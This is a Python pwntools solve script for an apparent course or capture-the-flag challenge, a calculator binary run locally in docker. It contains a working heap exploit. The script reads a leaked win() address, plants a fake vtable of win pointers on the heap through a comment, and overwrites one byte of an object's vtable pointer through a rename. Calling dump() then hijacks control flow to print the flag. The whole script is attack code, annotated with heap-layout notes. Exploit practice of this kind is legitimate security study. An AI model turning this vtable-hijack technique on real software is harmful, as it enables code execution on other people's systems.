#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/calc')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# wait for user input (in this time, connect gdb)
#pwn.pause()

# leak win function address
conn.recvuntil(b'win() is at ')
win_pointer = conn.recvline()
print(win_pointer)
win_p = int(win_pointer[2:], 16)
print(hex(win_p))

# store a fake vtable on the heap via a comment
comment = b'//aaaaaa' + pwn.p64(win_p)*10
conn.sendline(comment)
# at: 0x60ad5d5c7eb8 (last 3 nibbles are the same every time)
# now we can misinterpret comment+8 as the pointer to a vtable (points to )
#0x60ad5d5c7ec8 (this points to win())

# now we need to override the last byte of a vtable pointer of an expr with 0xc8 and we are done
pwn.pause()
# rename expr to trigger override
# i looked at heap and saw that at 058, right above the v0 object, there is a pointer to my comment
# we use this pointer as the pointer my vtable, so override 58
rename = b'v0aaaaaabbbbbbbb' + b'\x58' + b' := v0'
conn.sendline(rename)

pwn.pause()

#############
conn.sendline(b'list()')
conn.recvline()
conn.recvline()
name = conn.recvline()[:-1]
print(f'name: {name}')

# 5) trigger vtable lookup (e.g. with dump(var_name))
conn.sendline(b'dump(' + name + b')')
conn.recvline()
flag = conn.recvline()

print(flag)

conn.interactive()
